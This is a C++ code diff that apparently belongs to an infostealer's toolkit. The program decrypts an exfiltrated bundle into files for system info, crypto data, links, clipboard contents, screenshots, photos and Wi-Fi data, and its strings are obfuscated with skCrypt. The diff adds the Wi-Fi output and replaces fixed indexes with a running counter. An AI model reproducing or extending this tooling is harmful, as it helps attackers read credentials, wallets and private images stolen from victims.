@@ -48,9 +48,11 @@ int main() {
         content.push_back(line);
     inFile.close();
 
+    int contentIndex = 0;
+
     // info.txt
     bool founded = false;
-    string contentDecryptedOnce = aes_decrypt(KEY, content[0], IV);
+    string contentDecryptedOnce = aes_decrypt(KEY, content[contentIndex++], IV);
     string contentDecryptedTwice;
     vector<string> dividedContentDecryptedOnce = split(contentDecryptedOnce, ' ');
     for (int i = 0; i < dividedContentDecryptedOnce.size(); i++) {
@@ -93,7 +95,7 @@ int main() {
     cryptFile << smarker;
     cryptFile.close();
     ofstream cryptFile2(cryptFileName, ios::out | ios::binary);
-    cryptFile2 << aes_decrypt(KEY, content[1], IV);
+    cryptFile2 << aes_decrypt(KEY, content[contentIndex++], IV);
     cryptFile2.close();
     cout << skCrypt(" File decrypted in \"") << cryptFileName << skCrypt("\"\n");
 
@@ -104,7 +106,7 @@ int main() {
     linksFile << smarker;
     linksFile.close();
     ofstream linksFile2(linksFileName, ios::out | ios::binary);
-    linksFile2 << aes_decrypt(KEY, content[2], IV);
+    linksFile2 << aes_decrypt(KEY, content[contentIndex++], IV);
     linksFile2.close();
     cout << skCrypt(" File decrypted in \"") << linksFileName << skCrypt("\"\n");
 
@@ -115,22 +117,33 @@ int main() {
     clipFile << smarker;
     clipFile.close();
     ofstream clipFile2(clipFileName, ios::out | ios::binary);
-    clipFile2 << aes_decrypt(KEY, content[3], IV);
+    clipFile2 << aes_decrypt(KEY, content[contentIndex++], IV);
     clipFile2.close();
     cout << skCrypt(" File decrypted in \"") << clipFileName << skCrypt("\"\n");
+
+
+    // wifi.txt
+    string wifiFileName = filePath + (string)skCrypt("\\wifi.txt");
+    ofstream wifiFile(wifiFileName, ios::out | ios::binary);
+    wifiFile << smarker;
+    wifiFile.close();
+    ofstream wifiFile2(wifiFileName, ios::out | ios::binary);
+    wifiFile2 << aes_decrypt(KEY, content[contentIndex++], IV);
+    wifiFile2.close();
+    cout << skCrypt(" File decrypted in \"") << wifiFileName << skCrypt("\"\n");
 
 
     // screenshot.bmp
     string screenFileName = filePath + (string)skCrypt("\\screenshot.bmp");
     ofstream screenFile(screenFileName, ios::out | ios::binary);
-    vector<BYTE> screenshot = base64_decode(aes_decrypt(KEY, content[4], IV));
+    vector<BYTE> screenshot = base64_decode(aes_decrypt(KEY, content[contentIndex++], IV));
     screenFile.write((const char*)&screenshot[0], screenshot.size());
     screenFile.close();
     cout << skCrypt(" File decrypted in \"") << screenFileName << skCrypt("\"\n");
 
 
     // photos
-    for (string file : split(aes_decrypt(KEY, content[5], IV), '\n')) {
+    for (string file : split(aes_decrypt(KEY, content[contentIndex++], IV), '\n')) {
         vector<string> splitted = split(file, ' ');
         if (splitted.size() < 1)
             break;
